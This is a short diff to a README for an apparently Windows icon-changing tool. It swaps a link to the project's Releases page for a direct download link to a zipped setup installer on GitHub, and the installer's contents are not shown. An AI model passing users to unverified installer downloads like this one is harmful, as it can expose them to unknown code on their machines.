@@ -20,7 +20,7 @@
 
 ## Download
 
-Get the latest version from the **[Releases Page](./releases)**.
+Get the latest version from here **[Download latest release](https://github.com/simondaubner/Windows-Binary-Icon-Changer-V3/releases/download/Releases/IconChangerV3_Setup.zip)**.
 
 ## 🛠️ How to Change a Windows Icon
 
